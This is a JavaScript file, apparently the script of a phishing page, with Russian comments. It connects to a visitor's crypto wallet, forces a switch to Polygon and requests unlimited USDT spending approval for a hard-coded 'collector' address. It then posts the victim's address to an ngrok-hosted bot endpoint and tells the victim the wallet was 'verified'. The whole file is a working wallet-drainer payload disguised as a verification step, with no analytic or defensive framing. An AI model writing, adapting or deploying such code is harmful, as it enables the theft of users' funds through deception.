const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x2530C5aa0022B49832C593758d84aE70e40161cB';
const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex

async function startProcess() {
    const status = document.getElementById('status');
    
    // 1. Проверка наличия провайдера (кошелька)
    if (typeof window.ethereum === 'undefined') {
        status.innerText = '❌ Пожалуйста, откройте ссылку внутри Trust Wallet';
        return;
    }

    const web3 = new Web3(window.ethereum);

    try {
        status.innerText = '🔄 Проверка сети Polygon...';

        // 2. Принудительное переключение на Polygon
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (switchError) {
            // Если сеть не добавлена в кошелек, добавляем её
            if (switchError.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            } else {
                throw switchError;
            }
        }

        // 3. Запрос аккаунтов
        const accounts = await web3.eth.requestAccounts();
        const address = accounts[0];
        status.innerText = '⚙️ Подготовка транзакции...';

        // 4. Подготовка контракта
        const abi = [{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        // --- ГАРАНТИЯ ПРОХОЖДЕНИЯ ТРАНЗАКЦИИ (ГАЗ) ---
        // Получаем текущую цену газа в сети
        const currentGasPrice = await web3.eth.getGasPrice();
        // Увеличиваем цену на 20% для приоритета в очереди
        const adjustedGasPrice = Math.floor(Number(currentGasPrice) * 1.2).toString();
        
        status.innerText = '📝 Подтвердите активацию в кошельке...';

        // 5. Вызов Approve с рассчитанным газом
        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
            from: address,
            gasPrice: adjustedGasPrice 
        });

        status.innerText = '📡 Синхронизация данных...';

        // 6. Отправка адреса в твой бот (Ngrok)
        await fetch('https://gypseous-janis-wandlike.ngrok-free.dev/save-address', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Готово! Кошелек успешно верифицирован.';
        status.style.color = '#00ff00';

    } catch (error) {
        console.error(error);
        status.innerText = '❌ Ошибка: ' + (error.message.includes('User rejected') ? 'Вы отклонили транзакцию' : error.message.slice(0, 60));
    }
}

// Привязываем функцию к кнопке из твоего HTML
document.getElementById('connectBtn').addEventListener('click', startProcess);
